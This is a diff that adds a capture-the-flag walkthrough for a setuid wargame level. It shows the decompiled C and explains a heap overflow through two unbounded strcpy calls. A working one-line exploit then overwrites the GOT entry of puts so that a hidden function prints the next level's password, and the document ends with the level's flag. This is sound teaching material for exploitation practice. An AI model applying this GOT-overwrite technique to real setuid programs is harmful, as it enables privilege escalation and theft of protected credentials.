@@ -1,0 +1,53 @@
+# Level7 Walkthrough
+
+Binary is setuid `level8`.
+
+```c
+char c[68];
+
+void m(void) {
+  printf("%s - %d\n", c, time(NULL));
+}
+
+int main(int argc, char **argv) {
+  account *a = malloc(8);  a->id = 1;  a->name = malloc(8);
+  account *b = malloc(8);  b->id = 2;  b->name = malloc(8);
+
+  strcpy(a->name, argv[1]);
+  strcpy(b->name, argv[2]);
+
+  FILE *f = fopen("/home/user/level8/.pass", "r");
+  fgets(c, 68, f);
+  puts("~~");
+}
+```
+
+## Vulnerability
+
+Both `strcpy` are unbounded. On the heap the blocks are laid out
+`a` -> `a->name` -> `b` -> `b->name`. Overflowing `a->name` (first strcpy) with
+`argv[1]` overwrites the `b->name` pointer. The second `strcpy(b->name, argv[2])`
+then writes `argv[2]` to the address now held in `b->name`: arbitrary write
+(`argv[1]` chooses where, `argv[2]` chooses what).
+
+`m` prints the global `c`, which `fgets` already filled with the level8 pass, but
+`m` is never called.
+
+## Exploitation
+
+Arbitrary write into the GOT entry of `puts`, pointing it to `m`. When `main` calls
+`puts("~~")`, `m` runs and prints the pass.
+
+- Offset to `b->name`: 20 bytes.
+- GOT entry of `puts`: `0x08049928` -> `\x28\x99\x04\x08` (where).
+- Address of `m`: `0x080484f4` -> `\xf4\x84\x04\x08` (what).
+
+```sh
+./level7 $(python -c 'print "A"*20 + "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')
+```
+
+Flag:
+
+```txt
+5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
+```
